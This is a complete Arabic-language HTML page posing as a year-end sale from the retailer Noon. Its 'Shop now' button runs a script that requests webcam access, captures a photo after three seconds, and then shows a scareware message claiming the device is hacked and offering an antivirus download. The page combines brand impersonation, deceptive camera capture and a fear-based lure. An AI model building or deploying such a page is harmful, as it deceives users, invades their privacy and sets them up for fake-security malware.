<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خصومات نهاية السنة مع نون - اغتنم الفرصة</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: white; /* تغيير الخلفية إلى اللون الأبيض */
            color: black;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .highlight {
            background-color: yellow;
            color: black;
            font-size: 1.5rem;
            font-weight: bold;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        h1 {
            color: blue;
            margin-bottom: 20px;
        }
        p {
            color: black;
            margin-bottom: 15px;
        }
        .button-container {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .button {
            background-color: green;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            font-size: 1rem;
            margin: 10px 0;
            cursor: pointer;
        }
        .button:hover {
            background-color: darkgreen;
        }
        #video, #canvas {
            display: none;
            margin-top: 20px;
            border: 1px solid black;
        }
        .message {
            margin-top: 20px;
            font-size: 1.2rem;
            color: red;
            font-weight: bold;
            display: none;
        }
    </style>
</head>
<body>
    <div class="highlight">اغتنم الفرصة الآن!</div>
    <h1>خصومات نهاية السنة من نون</h1>
    <p>اغتنم أفضل العروض الآن قبل انتهاء الوقت!</p>
    <div class="button-container">
        <button id="shop-now" class="button">تسوق الآن</button>
    </div>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    <p id="hacked-message" class="message">تم تهكير جهازك، هل تريد تنزيل مضاد للفيروسات؟</p>

    <script>
        const shopNowButton = document.getElementById('shop-now');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const hackedMessage = document.getElementById('hacked-message');
        const context = canvas.getContext('2d');

        shopNowButton.addEventListener('click', () => {
            // طلب إذن الكاميرا
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    // عرض الفيديو من الكاميرا
                    video.style.display = 'block';
                    video.srcObject = stream;

                    // التقاط الصورة بعد 3 ثوانٍ
                    setTimeout(() => {
                        canvas.style.display = 'block';
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // إخفاء الفيديو وعرض الرسالة
                        video.style.display = 'none';
                        hackedMessage.style.display = 'block';
                    }, 3000);
                })
                .catch(err => {
                    alert('لم يتم منح إذن الكاميرا!');
                    console.error('خطأ في الوصول إلى الكاميرا:', err);
                });
        });
    </script>
</body>
</html>
